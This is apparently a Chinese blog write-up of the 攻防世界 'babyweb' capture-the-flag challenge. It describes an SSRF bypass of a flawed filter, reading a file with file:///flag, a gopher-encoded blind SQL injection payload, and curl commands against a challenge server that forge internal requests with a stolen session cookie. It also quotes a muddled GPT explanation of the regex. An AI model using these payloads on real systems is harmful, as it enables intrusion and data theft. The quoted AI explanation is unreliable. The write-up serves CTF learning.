@@ -1,0 +1,81 @@
+<!DOCTYPE html><html lang="en" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>攻防世界-babyweb | hybcx's blog</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"code.copy","copyFinish":"code.copyFinish","expand":"code.expand"}}</script><link rel="stylesheet" href="//unpkg.com/@waline/client@v2/dist/waline.css"><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/friends/"><span class="navItemTitle">Friends</span></a></li><li class="navItem"><a class="navBlock" href="/about"><span class="navItemTitle">About</span></a></li></ol></nav></header><div id="shadow-header"></div><article><div id="post-bg"><div id="post-title"><h1>攻防世界-babyweb</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2023-09-03T08:11:23.276Z" id="date"> 2023-09-03</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2023-09-03T09:22:01.817Z" id="updated"> 2023-09-03</time></div></span><br><span>文章总字数: <div class="control">784</div></span><br><span>预计阅读时间: <div class="control">3 分钟</div></span></div></div><hr><div id="post-content"><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2>
+<p>国赛华东北-内网访问</p>
+<h2 id="题目解题："><a href="#题目解题：" class="headerlink" title="题目解题："></a>题目解题：</h2>
+<p class='item-img' data-src='image-20230903162940780.png'><img src="image-20230903162940780.png" alt="image-20230903162940780"></p>
+<p>进入页面没啥信息，抓包，扫目录均扫不到，之后又用acunetix扫了也没啥信息，因此没啥头绪了，开始借鉴wp。</p>
+<p>看了wp发现 竟然有个ssrf.php页面，但我的dir竟然没扫到。。。于是将其添加到了字典里</p>
+<p>那我们访问看看</p>
+<p class='item-img' data-src='image-20230903163200528.png'><img src="image-20230903163200528.png" alt="image-20230903163200528"></p>
+<p>如上图我们先输入127.0.0.1看看</p>
+<p class='item-img' data-src='image-20230903163514586.png'><img src="image-20230903163514586.png" alt="image-20230903163514586"></p>
+<p>发现进入了某个数据库页面，随后我随便输了几个查询语句，均会重定向到ssrf.php页面，这里又不知道 如何做了，看了wp发现他直接file协议读取了flag。。。看来我想复杂了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">使用文件读取协议：file:///flag<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230903163852884.png'><img src="image-20230903163852884.png" alt="image-20230903163852884"></p>
+<p>看了官方wp后发现这似乎是非预期，官方采用gopher协议</p>
+<p>导致非预期解是因为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">preg_match(&#x27;/file|http://|dict/i&#x27;, $url);<br></code></pre></td></tr></table></figure>
+<p class='item-img' data-src='image-20230903165601286.png'><img src="image-20230903165601286.png" alt="image-20230903165601286"><br>
+正确的过滤方式应该是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">preg_match(&#x27;/file|http:\/\/|dict/i&#x27;, $url);<br></code></pre></td></tr></table></figure>
+<p>但这里我并不理解为何file能逃逸过去，GPT 回答如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">与第一个正则表达式不同的是，这个正则表达式中的 &quot;http://&quot; 是带有转义斜杠 &quot;/&quot; 的。这意味着它只会匹配包含具体的字符串 &quot;http://&quot;，而不会匹配像 &quot;https://&quot; 或 &quot;http://example.com&quot; 这样的字符串。此外，它仍然匹配包含 &quot;file&quot; 或 &quot;dict&quot; 的字符串。<br></code></pre></td></tr></table></figure>
+<p>这里我复现一下官方 wp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">然后就是ssrf+sql注入的考点，这个地方没有过多的过滤，主要考察的是mysql中取证能力<br><br>给出一个可行的sleep() poc<br><br>sleep延时注入爆破fake_flag表的第一个字母，其他的poc以此类推<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">poc如下：<br>gopher://127.0.0.1:80/_GET%20%2findex.php%253fquery%253Dselect%252520%25252a%252520from%252520fake_flag%252520where%252520if%252528mid%252528%252528select%252520flag%252520from%252520fake_flag%252520limit%2525200,1%252529,1,1%252529%25253D%252522t%252522,sleep%2525283%252529,0%252529%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a<br></code></pre></td></tr></table></figure>
+<p>在注入之后，会发现没有办法得到flag，这个时候需要去考虑到底是不是没有注入完全部的数据库</p>
+<p>因为database和show被过滤了，所以看不到其他数据库</p>
+<p>但是通过information_schema.processlist表格来查看正在运行的sql命令<br>
+发现可疑数据库名：hintda91947e762d8c1d0d1b3d72d3369629</p>
+<p>然后访问da91947e762d8c1d0d1b3d72d3369629.php<br>
+发现也是需要内网，而且提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">you need admin<br></code></pre></td></tr></table></figure>
+<p>在输入框输入da91947e762d8c1d0d1b3d72d3369629</p>
+<p>发现回显了admin</p>
+<p>说明这个时候我们是管理员，</p>
+<p>然后就需要我们带着这个cookie去登录da91947e762d8c1d0d1b3d72d3369629.php页面</p>
+<p>所以我们最后的poc为</p>
+<p>输入密码打sql注入然后得到setcookie的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252findex.php%253fquery%253Dda91947e762d8c1d0d1b3d72d3369629%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a<br></code></pre></td></tr></table></figure>
+<p>得到返回的页面内容里面的set phpsessid<br>
+ru1n2mphovds3qosjg3n8o3661</p>
+<p>然后带着这个sessionid继续打</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">curl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252fda91947e762d8c1d0d1b3d72d3369629.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250aCookie%3A%20PHPSESSID%3Dru1n2mphovds3qosjg3n8o3661%3B%250d%250a<br></code></pre></td></tr></table></figure>
+<p>但是这个过程有点懵</p>
+<h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aa2528877987/article/details/131258428?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169372955816800227445511%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169372955816800227445511&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-5-131258428-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cbabyweb&amp;spm=1018.2226.3001.4187">【愚公系列】2023年06月 攻防世界-Web（babyweb）</a></p>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2023/09/03/wzsc_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">← 下一篇 攻防世界-wzsc_文件上传</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/09/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-Windows%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AF%87/">内网渗透学习-Windows信息搜集篇-持续更新 上一篇 →</a></div></div></div><div id="comments"><div id="waline"></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">hybcx</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0%EF%BC%9A"><span class="toc-number">1.</span> <span class="toc-text">题目描述：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E8%A7%A3%E9%A2%98%EF%BC%9A"><span class="toc-number">2.</span> <span class="toc-text">题目解题：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0%EF%BC%9A"><span class="toc-number">3.</span> <span class="toc-text">参考文章：</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
